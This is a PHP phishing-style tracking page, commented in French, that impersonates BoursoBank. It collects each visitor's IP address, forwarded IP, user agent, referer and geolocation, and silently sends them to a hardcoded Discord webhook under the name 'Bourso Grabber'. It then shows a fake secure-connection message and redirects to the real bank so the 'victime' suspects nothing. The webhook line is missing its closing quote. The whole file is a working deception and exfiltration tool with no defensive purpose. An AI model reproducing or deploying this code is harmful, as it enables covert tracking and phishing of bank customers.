<?php
// ============================================================================
// CONFIG – METS TON WEBHOOK ICI (crée un webhook dans un salon Discord privé)
// ============================================================================
$webhook_url = 'https://discord.com/api/webhooks/1462775716759474301/H9LdCZbmdBcE1kVWi-TiWngKNntNfXZyOP2vbpk3OX5PQI3RW4QRhbD3aC8pl7KjBQnv;

// ============================================================================
// Récup infos basiques (sans API externe pour être plus discret)
// ============================================================================
$ip         = $_SERVER['REMOTE_ADDR'] ?? 'inconnu';
$forwarded  = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $ip;
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'inconnu';
$referer    = $_SERVER['HTTP_REFERER'] ?? 'direct';
$time       = date('d/m/Y H:i:s');

// Tentative de premier forwarded IP (souvent le vrai si proxy/VPN)
$real_ip = explode(',', $forwarded)[0] ?? $ip;

// ============================================================================
// Optionnel : petite géo via ip-api (très fiable et gratuit, 45 req/min)
// ============================================================================
$geo_data = @json_decode(file_get_contents("http://ip-api.com/json/{$real_ip}?fields=status,message,country,city,regionName,isp,org,proxy,hosting"), true) ?? [];
$pays   = $geo_data['country']     ?? '?';
$ville  = $geo_data['city']        ?? '?';
$region = $geo_data['regionName']  ?? '?';
$isp    = $geo_data['isp']         ?? '?';
$org    = $geo_data['org']         ?? '?';
$proxy  = ($geo_data['proxy'] ?? false) ? 'Oui (VPN/Proxy/Tor)' : 'Non';

// ============================================================================
// Embed Discord propre
// ============================================================================
$embed = [
    'title'       => 'Nouvelle victime sur la page Bourso',
    'description' => "Connexion détectée",
    'color'       => 0xFF4444,
    'fields'      => [
        ['name' => 'IP (publique)',     'value' => $real_ip,              'inline' => true],
        ['name' => 'IP forwarded',      'value' => $forwarded ?: 'aucun', 'inline' => true],
        ['name' => 'Date-Heure',        'value' => $time,                 'inline' => true],
        ['name' => 'Pays / Ville',      'value' => "$pays - $ville ($region)", 'inline' => false],
        ['name' => 'FAI / Org',         'value' => "$isp ($org)",         'inline' => false],
        ['name' => 'Proxy/VPN ?',       'value' => $proxy,                'inline' => true],
        ['name' => 'User-Agent',        'value' => substr($user_agent, 0, 100) . (strlen($user_agent)>100?'...':'') , 'inline' => false],
        ['name' => 'Referer',           'value' => substr($referer, 0, 200) ?: 'direct', 'inline' => false],
    ],
    'footer'      => ['text' => 'Logger simple • IP privée = impossible sans malware ou WebRTC'],
    'timestamp'   => date('c'),
];

$payload = json_encode(['embeds' => [$embed], 'username' => 'Bourso Grabber']);

// Envoi silencieux
$ch = curl_init($webhook_url);
curl_setopt_array($ch, [
    CURLOPT_POST       => 1,
    CURLOPT_POSTFIELDS => $payload,
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 5,
    CURLOPT_SSL_VERIFYPEER => false, // à enlever en prod si possible
]);
curl_exec($ch);
curl_close($ch);

// ============================================================================
// Option : rediriger vers la vraie Bourso pour pas que la victime se doute
// ============================================================================
// header('Location: https://www.boursobank.com/');
// exit;

// Ou afficher un fake message de chargement
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="1;url=https://www.boursobank.com/">
    <title>Redirection...</title>
</head>
<body style="background:#000;color:#0f0;font-family:monospace;">
    <h2>Connexion sécurisée en cours... Veuillez patienter</h2>
</body>
</html>